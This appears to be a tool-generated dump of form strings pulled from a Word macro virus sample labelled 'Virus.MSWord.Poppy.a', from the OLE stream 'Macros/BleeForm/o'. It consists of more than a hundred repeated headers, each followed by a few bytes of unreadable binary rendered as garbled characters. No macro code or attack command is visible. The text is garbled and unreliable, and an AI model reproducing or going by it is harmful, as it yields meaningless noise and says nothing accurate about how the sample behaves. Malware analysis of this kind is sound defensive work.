-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z*�g��ʁ<й
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���a��#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x="�~�VJ=6""X�Ij�2��A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����"2##��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�q��k��]��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?*��(ϰ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~�z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t���]��j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_���ӫ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d��&�I�T�SsM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^f����˕�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SP��Ƽp}~�4iUq����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y�X��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rzAe(6,�e�~e_����ug;5�?x��-,wo���I[�B�W�+ց��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l=Hϱ0�~�H��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x����U���%@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�1�p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E����Z��z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g鞾S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/<�Ֆ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
㋵��]-����4P��-F���\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
aM"�R��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kE�k���r�����f����2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#����h)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tzu�Fe#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���{�0l�������t4t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^CQ-4�S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����"z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�#=v#s�뙐�cg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
׮]���z�M�t�Z�:x�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j���\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���<z���:5R�h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����=3�6]*+).�<H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

�Y��<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�V ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0ry�>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~z��r��,��e-�z&ǒ�T$�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Kf*Z�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!��G9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O����R�$δq��D2	q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������g�n�����@�� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�3���㦸�[H�V���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QR����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��g���z2h��Š���O��Ϊ��<!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�ރ�mkq�2M$�P:8`�QpH/�g냞y$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m]AJD5:V:�6���bFO���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ap�(&�QZ����y���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Py
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W����C�O
�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8��:�X1R}6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�aZ�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���r�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�몃�B�x���	��(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�28,z
U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X#�NG]�_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8=90�Jz>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%�R*Q�9�mS�	��S대
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6����	�ϗ��F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9��'ە�jzƤ����G#m"6��<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[.'�s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dԞb��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U 6�rJ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��یs��]0��������H��7'j�C(�>����㑭����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)$�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8���=}E�F�[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9O=�)���09^00q�G�~m�g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�c��Yrd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F*�a;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���w(r��犂��]d*�+�RDVRT�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�bp@�=q}�V--O�?Pʭ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l��Q����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�rp:mA�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��*% �5aB��ռ�+���a�*��cҵ��,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B��.֓��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2B��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,�\��w��6�*&fUr2���x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q���W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u,��T�b�A&4��V�~K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0��mi�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S1�s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$y)�G�d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
¿��_⇽�>�h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��֪<��,1�Y؟E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F������xx���E�L���7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L�ԙ�U�X|8v�Wx����=|V�(�QC5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T~��=:�������\�5-ʥ�j��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kS�Ug�7���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cv'�}��A�{wg�Aa5�k�夑��G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��T��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C3*���_�zv
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.�K����yզ�-�]])��c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)��(����w�ǘ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<[/w�2�k��=m�|�z�!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VWh��f�����ϼOv�j;����4��n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"�'d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���NO
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
26���U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O>L��٣
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=C����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��d�?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�n��]J���"#?6"_��= ��1��F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%}y��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t�&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%T��;Asǧ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�ߔ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

��YI�O��K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�N��a�s���:��axb�O��36��R�u\p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p��c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�C��9ܣ;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	$���n�[3K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	;����<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>��CY#o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rkh���'3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{���s؞�\;k�KX���0�V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`o��*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
